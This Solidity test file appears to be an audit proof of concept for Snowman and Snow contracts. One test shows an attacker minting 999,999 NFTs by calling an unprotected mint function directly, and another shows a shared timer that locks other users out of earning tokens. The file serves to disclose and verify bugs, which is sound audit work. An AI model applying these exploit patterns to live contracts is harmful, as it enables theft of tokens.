// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Snowman} from "../../src/Snowman.sol";
import {Snow} from "../../src/Snow.sol";
import {MockWETH} from "../../src/mock/MockWETH.sol";

contract TestAuditPoC is Test {
    Snowman public snowman;
    Snow public snow;

    address attacker = makeAddr("attacker");

    function setUp() public {
        MockWETH weth = new MockWETH();
        snowman = new Snowman("data:image/svg+xml;base64,PLACEHOLDER");
        snow = new Snow(address(weth), 1,  address(this));
    }

    function test_H01_mintSnowman_hasNoAccessControl() public {
        // Attacker has zero Snow tokens, no signature, no merkle proof —
        // they call Snowman directly, completely bypassing SnowmanAirdrop
        vm.prank(attacker);
        snowman.mintSnowman(attacker, 999_999);

        // If this line is reached without reverting, the attacker
        // now owns 999,999 NFTs for free
        assertEq(snowman.balanceOf(attacker), 999_999);
    }
    function test_H03_earnSnow_sharedTimerLocksOutOtherUsers() public {
    address userA = makeAddr("userA");
    address userB = makeAddr("userB");

    // userA earns their free Snow first
    vm.prank(userA);
    snow.earnSnow();

    // userA now has 1 Snow token
    assertEq(snow.balanceOf(userA), 1);

    // userB has NEVER called earnSnow before — this is their very first attempt
    // If the timer were per-user, this should succeed with no problem
    vm.prank(userB);
    vm.expectRevert(Snow.S__Timer.selector);
    snow.earnSnow();

    // Confirm userB got nothing, purely because userA called first
    assertEq(snow.balanceOf(userB), 0);
}
}